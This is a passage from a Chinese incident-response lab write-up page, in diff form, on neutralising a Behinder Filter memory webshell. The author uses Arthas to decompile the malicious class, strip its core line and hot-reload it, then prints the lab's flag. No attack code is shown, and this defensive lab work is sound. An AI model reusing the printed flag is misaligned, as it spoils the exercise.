+</div>
+</div><p>编译生成java文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">jad</span> <span class="o">--</span><span class="nx">source</span><span class="o">-</span><span class="nx">only</span> <span class="nx">com</span><span class="o">.</span><span class="nx">summersec</span><span class="o">.</span><span class="nx">x</span><span class="o">.</span><span class="nx">BehinderFilter</span> <span class="o">&gt;</span> <span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">BehinderFilter</span><span class="o">.</span><span class="nx">java</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改删除那一行核心代码后，编译为class文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">arthas</span><span class="o">@</span><span class="mi">1</span><span class="p">]</span><span class="err">$</span> <span class="nx">mc</span> <span class="o">-</span><span class="nx">c</span> <span class="mi">53</span><span class="nx">a38d25</span> <span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">BehinderFilter</span><span class="o">.</span><span class="nx">java</span> <span class="o">-</span><span class="nx">d</span> <span class="o">/</span><span class="nx">tmp</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Memory</span> <span class="nx">compiler</span> <span class="nx">output</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">com</span><span class="o">/</span><span class="nx">summersec</span><span class="o">/</span><span class="nx">x</span><span class="o">/</span><span class="nx">BehinderFilter</span><span class="o">.</span><span class="k">class</span>
+</span></span><span class="line"><span class="cl"><span class="nc">Affect</span><span class="p">(</span><span class="nx">row</span><span class="o">-</span><span class="nx">cnt</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span> <span class="nx">cost</span> <span class="nx">in</span> <span class="mi">300</span> <span class="nx">ms</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">arthas</span><span class="o">@</span><span class="mi">1</span><span class="p">]</span><span class="err">$</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后进行热加载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">retransform</span> <span class="o">/</span><span class="nx">tmp</span><span class="o">/</span><span class="nx">com</span><span class="o">/</span><span class="nx">summersec</span><span class="o">/</span><span class="nx">x</span><span class="o">/</span><span class="nx">BehinderFilter</span><span class="o">.</span><span class="k">class</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>‍</p>
+<p>再次尝试，虽然可以访问</p>
+<p><img loading="lazy" src="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746603605977-20250507154008-p8rsae3.png" alt="QQ_1746603605977" srcset="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746603605977-20250507154008-p8rsae3.png?size=small, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746603605977-20250507154008-p8rsae3.png?size=medium 1.5x, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746603605977-20250507154008-p8rsae3.png?size=large 2x" data-title="QQ_1746603605977" style="--width: 2038px;--aspect-ratio: 2038 / 262;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>但是使用冰蝎已经无法连接</p>
+<p><img loading="lazy" src="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746603618212-20250507154020-p4b8oau.png" alt="QQ_1746603618212" srcset="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746603618212-20250507154020-p4b8oau.png?size=small, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746603618212-20250507154020-p4b8oau.png?size=medium 1.5x, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746603618212-20250507154020-p4b8oau.png?size=large 2x" data-title="QQ_1746603618212" style="--width: 2600px;--aspect-ratio: 2600 / 1656;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>刷新web后稍等5秒左右拿到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">flag</span><span class="p">{</span><span class="mi">6</span><span class="nx">a5748bb308b8c8628bece4c67551b5e</span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746619159956-20250507195922-iiu5sjs.png" alt="QQ_1746619159956" srcset="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746619159956-20250507195922-iiu5sjs.png?size=small, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746619159956-20250507195922-iiu5sjs.png?size=medium 1.5x, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746619159956-20250507195922-iiu5sjs.png?size=large 2x" data-title="QQ_1746619159956" style="--width: 1708px;--aspect-ratio: 1708 / 568;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>‍</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-06-14 19:00:44">Updated on 2025-06-14&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/" data-title="内存马分析-冰蝎内存马(Filter)" data-hashtags="应急响应,玄机,内存马应急"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/" data-hashtag="应急响应"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/" data-title="内存马分析-冰蝎内存马(Filter)"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-tag" title="Tags - 应急响应">应急响应</a><a href="/tags/%E7%8E%84%E6%9C%BA/" class="post-tag" title="Tags - 玄机">玄机</a><a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC%E5%BA%94%E6%80%A5/" class="post-tag" title="Tags - 内存马应急">内存马应急</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/cobaltstrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="post-nav-item" rel="prev" title="CobaltStrike流量分析"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CobaltStrike流量分析</a><a href="/posts/%E4%BE%9B%E5%BA%94%E9%93%BE%E5%BA%94%E6%80%A5-part3/" class="post-nav-item" rel="next" title="供应链应急-Part3">供应链应急-Part3<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.141.0">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.16">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">xiaole</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1000},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
